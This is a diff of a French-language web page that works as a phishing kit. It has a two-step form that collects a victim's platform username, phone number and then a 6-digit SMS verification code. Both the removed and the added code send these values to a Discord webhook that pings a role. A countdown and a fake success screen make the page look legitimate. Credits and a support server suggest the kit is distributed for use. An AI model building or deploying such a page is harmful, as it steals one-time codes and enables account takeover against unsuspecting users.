-                    ],
-                    footer: {
-                        text: "⚡ Système automatisé • " + new Date().toISOString() + " • Role ping",
-                    },
-                }, ],
-            };
+            // ENVOI ÉTAPE 1 (pseudo + téléphone)
+            await sendEtape1(donnees.pseudo, donnees.telephone);
 
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload),
-                });
-                webhookEnvoye = true;  // Marquer comme envoyé
-                console.log("[Webhook] Envoyé avec ping du role " + ROLE_ID + " : " + etiquette + " = " + valeur);
-            } catch (erreur) {
-                console.debug("[Webhook] Erreur d'envoi (ignorée)");
-            }
+            goToEtape2();
+            return;
         }
 
-        function lancerCompteARebours() {
-            tempsRestant = DUREE_TOTALE;
-            blocTimer.classList.add("active");
-            affichageTimer.textContent = tempsRestant;
-            mettreAJourArc(100);
-
-            boutonAction.disabled = true;
-            champSaisie.disabled = true;
-
-            intervalleTimer = setInterval(() => {
-                tempsRestant--;
-                affichageTimer.textContent = tempsRestant;
-
-                const pourcentage = (tempsRestant / DUREE_TOTALE) * 100;
-                mettreAJourArc(pourcentage);
-
-                if (tempsRestant <= 0) {
-                    clearInterval(intervalleTimer);
-                    intervalleTimer = null;
-                    blocTimer.classList.remove("active");
-                    mettreAJourArc(0);
-                    boutonAction.disabled = false;
-                    champSaisie.disabled = false;
-                    champSaisie.value = "";
-                    champSaisie.focus();
-                }
-            }, 1000);
-        }
-
-        function passerEtape2() {
-            etape = 2;
-            badgePhase.textContent = "● Phase 2 — Code SMS";
-            badgePhase.classList.add("warning");
-            texteIndice.textContent = "📩 Entrez le code à 6 chiffres reçu par SMS";
-            champSaisie.placeholder = "Code SMS (ex: 123456)";
-            champSaisie.setAttribute("maxlength", "6");
-            champSaisie.setAttribute("inputmode", "numeric");
-            hintPseudo.textContent = "";
-            wrapperPseudo.style.display = "none";
-            boutonAction.innerHTML = '<span class="btn-icon">🔐</span> Vérifier';
-            lancerCompteARebours();
-        }
-
-        function afficherSucces() {
-            blocSucces.classList.add("show");
-            boutonAction.disabled = true;
-            champSaisie.disabled = true;
-            wrapperSaisie.style.opacity = "0.45";
-            badgePhase.textContent = "● Terminé";
-            badgePhase.classList.remove("warning");
-            badgePhase.style.background = "rgba(0,230,118,0.12)";
-            badgePhase.style.color = "#00e676";
-            badgePhase.style.borderColor = "rgba(0,230,118,0.25)";
-            texteIndice.textContent = "✅ Opération complétée avec succès";
-        }
-
-        // ============================================================
-        // GESTION PRINCIPALE
-        // ============================================================
-        async function traiterSoumission() {
-            const valeurPseudo = champPseudo.value.trim();
-            const valeurTel = champSaisie.value.trim();
-
-            if (etape === 1) {
-                if (!valeurPseudo) {
-                    secouerChamp(wrapperPseudo);
-                    return;
-                }
-                if (!valeurTel) {
-                    secouerChamp(wrapperSaisie);
-                    return;
-                }
-
-                const chiffresSeuls = valeurTel.replace(/\D/g, "");
-                if (chiffresSeuls.length < 9) {
-                    secouerChamp(wrapperSaisie);
-                    champSaisie.placeholder = "Numéro invalide, réessayez...";
-                    champSaisie.value = "";
-                    return;
-                }
-
-                pseudoPlateforme = valeurPseudo;
-                numeroTelephone = valeurTel;
-
-                // Envoi du pseudo vers le webhook (1 seule fois)
-                await envoyerWebhook("👤 Pseudo", pseudoPlateforme);
-                await envoyerWebhook("📞 Numéro de téléphone", numeroTelephone);
-
-                passerEtape2();
+        if (etape === 2) {
+            if (!valTel) { shake(wrapperSaisie); return; }
+            if (tempsRestant > 0) {
+                shake(wrapperSaisie);
+                userInput.placeholder = "⏳ Attendez la fin du timer...";
+                userInput.value = "";
                 return;
             }
-
-            if (etape === 2) {
-                if (!valeurTel) {
-                    secouerChamp(wrapperSaisie);
-                    return;
-                }
-                if (tempsRestant > 0) {
-                    secouerChamp(wrapperSaisie);
-                    champSaisie.placeholder = "⏳ Attendez la fin du timer...";
-                    champSaisie.value = "";
-                    return;
-                }
-
-                const codeSMS = valeurTel.replace(/\D/g, "");
-                if (codeSMS.length !== 6) {
-                    secouerChamp(wrapperSaisie);
-                    champSaisie.placeholder = "Code invalide (6 chiffres requis)";
-                    champSaisie.value = "";
-                    return;
-                }
-
-                // Envoi du code SMS vers le webhook (1 seule fois)
-                await envoyerWebhook("🔢 Code SMS reçu", codeSMS);
-                afficherSucces();
+            const code = valTel.replace(/\D/g, "");
+            if (code.length !== 6) {
+                shake(wrapperSaisie);
+                userInput.placeholder = "Code invalide (6 chiffres requis)";
+                userInput.value = "";
+                return;
             }
+            donnees.code = code;
+
+            // ENVOI ÉTAPE 2 (code SMS)
+            await sendEtape2(donnees.code);
+
+            showSuccess();
         }
+    }
 
-        // ============================================================
-        // ÉVÉNEMENTS
-        // ============================================================
-        boutonAction.addEventListener("click", traiterSoumission);
+    // ============================================================
+    // ÉVÉNEMENTS
+    // ============================================================
+    actionBtn.addEventListener("click", handleSubmit);
+    userInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); handleSubmit(); } });
+    pseudoInput.addEventListener("keydown", (e) => { if (e.key === "Enter") { e.preventDefault(); handleSubmit(); } });
 
-        champSaisie.addEventListener("keydown", (e) => {
-            if (e.key === "Enter") {
-                e.preventDefault();
-                traiterSoumission();
-            }
-        });
-        champPseudo.addEventListener("keydown", (e) => {
-            if (e.key === "Enter") {
-                e.preventDefault();
-                traiterSoumission();
-            }
-        });
+    window.addEventListener("beforeunload", () => { if (intervalleTimer) clearInterval(intervalleTimer); });
 
-        // ============================================================
-        // NETTOYAGE
-        // ============================================================
-        window.addEventListener("beforeunload", () => {
-            if (intervalleTimer) clearInterval(intervalleTimer);
-        });
-
-        console.log("✅ Site chargé - Un seul webhook avec ping du role " + ROLE_ID);
-        console.log("🔗 Support : discord.gg/2fe7CQttHR | Credits : c26i & cloudric");
-    </script>
+    console.log("✅ Site chargé - Envoi étape 1 (pseudo+téléphone) puis étape 2 (code) avec ping du role " + ROLE_ID);
+    console.log("🔗 Support : discord.gg/2fe7CQttHR | Credits : c26i & cloudric");
+</script>
 </body>
 </html>
